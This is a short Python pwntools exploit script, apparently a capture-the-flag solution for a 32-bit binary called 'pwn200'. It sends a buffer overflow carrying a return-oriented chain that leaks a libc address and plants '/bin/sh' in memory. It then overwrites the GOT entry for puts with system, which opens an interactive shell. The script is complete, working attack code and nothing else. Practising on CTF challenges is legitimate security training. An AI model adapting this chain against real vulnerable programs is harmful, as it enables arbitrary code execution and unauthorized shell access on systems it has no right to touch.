from pwn import *
target = "./pwn200"

p    = process(target)
e    = ELF(target)
pppr = 0x08048599
pr   = pppr + 2
bss  = 0x0804a000

print p.recv()

payload = "A" * 0x18 + "B" * 4
payload += p32(e.plt['puts'])
payload += p32(pr)
payload += p32(e.got['__libc_start_main'])
payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)
payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.got['puts'])
payload += p32(4)
payload += p32(e.plt['puts'])
payload += p32(pr)
payload += p32(bss)

p.sendline(payload)

recv = p.recv().split("\n")[0]
libc_base = u32(recv) - 0x18540
system = libc_base + 0x3a940

log.info("libc base : {}".format(hex(libc_base)))
log.info("system    : {}".format(hex(system)))

p.send("/bin/sh\x00")
p.send(p32(system))

p.interactive()

